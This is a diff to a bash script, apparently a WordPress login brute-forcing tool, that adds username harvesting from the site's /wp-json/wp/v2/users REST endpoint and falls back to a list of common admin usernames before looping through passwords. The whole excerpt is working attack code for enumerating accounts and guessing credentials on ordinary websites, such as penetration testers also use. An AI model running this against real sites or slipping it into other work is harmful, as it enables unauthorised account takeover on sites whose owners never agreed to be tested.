@@ -115,10 +115,24 @@ if [ "$response_code" == "401" ]; then
 	echo ""
 	
 	# Try to fetch usernames from /wp-json/wp/v2/users
+	USERS_URL="$dnsname/wp-json/wp/v2/users"
+	response_code=$(curl -s -o /dev/null -w "%{http_code}" "$USERS_URL")
+	if [ "$response_code" == "200" ]; then
 	
-	# Otherwise, just use some common default WordPress logins
-	wordpressusernames=("adm" "admin" "admin1" "manager" "root" "support" "sysadmin" "test" "user" "wordpress" "wp" "wp-admin" "wpadmin")
-	wordpressusernames_length=${#wordpressusernames[@]}
+		# Jackpot! Harvest the user list.
+		echo -e " Harvesting username list from [/wp-json/wp/v2/users]..."
+		wordpressusernames=$(curl -s "$USERS_URL" | jq -r '.[].slug')
+		wordpressusernames=($wordpressusernames)
+		wordpressusernames_length=${#wordpressusernames[@]}
+	
+	else
+	
+		# Just use some common default WordPress logins.
+		echo -e " Could not access [/wp-json/wp/v2/users], using default usernames instead..."
+		wordpressusernames=("adm" "admin" "admin1" "manager" "root" "support" "sysadmin" "test" "user" "wordpress" "wp" "wp-admin" "wpadmin")
+		wordpressusernames_length=${#wordpressusernames[@]}
+	
+	fi
 	
 	# For each password...
 	counter=0
